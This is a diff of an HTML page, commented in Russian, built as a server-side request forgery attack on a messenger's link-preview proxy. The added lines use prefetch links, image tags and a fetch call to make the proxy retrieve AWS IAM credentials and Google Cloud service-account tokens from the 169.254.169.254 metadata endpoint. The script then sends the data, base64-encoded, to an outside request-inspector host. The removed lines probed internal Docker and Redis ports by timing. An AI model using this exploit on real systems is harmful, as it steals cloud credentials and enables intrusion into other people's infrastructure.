@@ -2,52 +2,29 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Infrastructure Test</title>
+    <title>Internal Data Check</title>
+    
+    <meta property="og:description" content="Check result">
+    
+    <link rel="prefetch" href="https://max.ru/proxy?url=http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/default">
+
+    <img src="https://max.ru/proxy?url=http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token?header=Metadata-Flavor:Google">
+
 </head>
 <body>
-    <h1 id="status">Запуск теста...</h1>
-    <div id="results"></div>
-
     <script>
+        // Если бот всё же умеет в JS, этот код отправит нам точное время
         const inspector = "https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com";
-        const proxy = "https://max.ru/proxy?url=";
+        const sensitiveTarget = "http://169.254.169.254.nip.io/latest/meta-data/";
         
-        const targets = [
-            {n: "Docker", u: "http://127.0.0.1.nip.io:2375"},
-            {n: "Redis", u: "http://127.0.0.1.nip.io:6379"},
-            {n: "Metadata", u: "http://169.254.169.254.nip.io/latest/meta-data/"}
-        ];
-
-        function logToInspector(name, time) {
-            // Создаем невидимую картинку, чтобы отправить данные на инспектор в обход CORS
-            const img = new Image();
-            img.src = `${inspector}/REPORT?target=${name}&time=${time}ms&nonce=${Math.random()}`;
-        }
-
-        async function start() {
-            for (let t of targets) {
-                const start = Date.now();
-                
-                // Создаем элемент картинки, который пойдет через прокси мессенджера
-                const probe = new Image();
-                // Это заставит СЕРВЕР VK попытаться скачать "картинку" с порта 2375
-                probe.src = `${proxy}${encodeURIComponent(t.u)}/favicon.ico?cb=${start}`;
-                
-                // Ждем 7 секунд или пока "картинка" не выдаст ошибку
-                await new Promise(resolve => {
-                    probe.onload = probe.onerror = resolve;
-                    setTimeout(resolve, 7000); 
-                });
-
-                const duration = Date.now() - start;
-                logToInspector(t.n, duration);
-                
-                document.getElementById('results').innerHTML += `<p>${t.n}: ${duration}ms</p>`;
-            }
-            document.getElementById('status').innerText = "Готово! Проверяй инспектор.";
-        }
-
-        start();
+        fetch(`https://max.ru/proxy?url=${encodeURIComponent(sensitiveTarget)}`)
+            .then(r => r.text())
+            .then(data => {
+                // Если мы получили данные, шлем их тебе в инспектор (BASE64)
+                fetch(`${inspector}/EXFILTRATED_DATA?d=${btoa(data.substring(0, 100))}`);
+            }).catch(e => {
+                fetch(`${inspector}/ERROR?e=blocked`);
+            });
     </script>
 </body>
 </html>
